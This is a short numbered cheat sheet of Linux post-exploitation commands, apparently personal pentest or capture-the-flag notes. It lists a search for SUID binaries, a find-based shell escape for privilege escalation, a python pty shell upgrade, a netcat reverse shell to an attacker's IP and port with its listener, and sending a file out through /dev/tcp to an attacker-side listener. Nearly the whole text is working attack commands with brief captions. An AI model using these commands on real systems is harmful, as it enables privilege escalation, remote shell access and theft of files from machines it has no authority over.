1. `find / -perm -u=s -type f 2>/dev/null` 
2. `find . -exec /bin/sh \; -quit` 
3. `python -c ‘import pty; pty.spawn(“/bin/bash”)’  ` - Gain a shell when prsent on netcat
4. `nc -e /bin/bash <ip> <port>` & `nc -lvnp <port>` - To connect and get a shell
5. `cat /path/to/file > /dev/tcp/ip/new_port` - Use this on the connected target shell and `nc -lvnp new_port > filename` - This on the new Attacker Shell, then it downloads the file over on the Target File
6. 